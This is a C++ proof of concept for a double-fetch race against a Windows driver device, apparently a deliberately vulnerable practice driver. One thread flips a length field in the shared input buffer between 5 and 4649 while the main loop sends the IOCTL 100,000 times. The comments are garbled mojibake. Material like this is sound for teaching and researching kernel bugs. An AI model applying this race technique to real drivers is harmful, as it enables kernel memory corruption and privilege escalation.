/* Double fetch bug PoC
 * �������w�肷��ƃX���b�h�����Ȃ��Ȃ�
 */
#include <cstdio>
#include <Windows.h>

char in_buf[0x10]; // ���̓o�b�t�@
char out_buf[0x10]; // �o�̓o�b�t�@

#define IOCTL_DOUBLE_FETCH CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER,FILE_ANY_ACCESS)

DWORD WINAPI Changer(LPVOID lpParameter)
{
    auto pVuln = (DWORD*)lpParameter;
    printf("In thread.\n");
    while (true)
    {
        printf("T");
        // �����Ђ�����ɐƎ�ȃ|�C���^�������t���b�v���܂���X���b�h
        if (*pVuln == 5) *pVuln = 4649; // �ُ�l
        else *pVuln = 5; // ����l
    }
}

void Attack(HANDLE h, bool trigger)
{
    printf("%p\n", in_buf);
    DWORD tid = 0;
    auto x = (DWORD*)in_buf;
    *x = 5;
    auto th = INVALID_HANDLE_VALUE;
    // �t���b�v���܂���X���b�h��p�ӂ���
    if (trigger) {
        th = CreateThread(NULL,
            0,
            Changer,
            in_buf, // partlen1�̃|�C���^
            0,
            &tid
        );
    }
    /* �^�ǂ����΂��邱�Ƃ��F��Ȃ��牽���DeviceIoControl���Ă� */
    printf("DeviceIoControl!\n");
    DWORD a = 0;
    for (auto i = 0; i < 100000; i++)
    {
        // printf("D");
        DeviceIoControl(h,
            IOCTL_DOUBLE_FETCH,
            x,
            0x10,
            out_buf,
            0x10,
            &a,
            NULL
        );
    }
    if (trigger) {
        // 10����������X���b�h���~�߂�
        TerminateThread(th, 0);
    }

}

int main(int argc, char** argv)
{
    /* �h���C�o���J�� */
    printf("CreateFile...");
    const auto hFile = CreateFile(L"\\\\.\\DFetchBug",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("failed: %d\n", GetLastError());
        return 0;
    }
    else {
        printf("success\n");
    }

    // trigger==true�̂Ƃ���double fetch���N����
    const auto trigger = argc != 2;
    printf("Sleep(3000)...");
    Sleep(3000);
    printf("done\n");

    Attack(hFile, trigger);

    // �������΂��Ȃ��悤��3�b�X���[�v
    return 0;
}
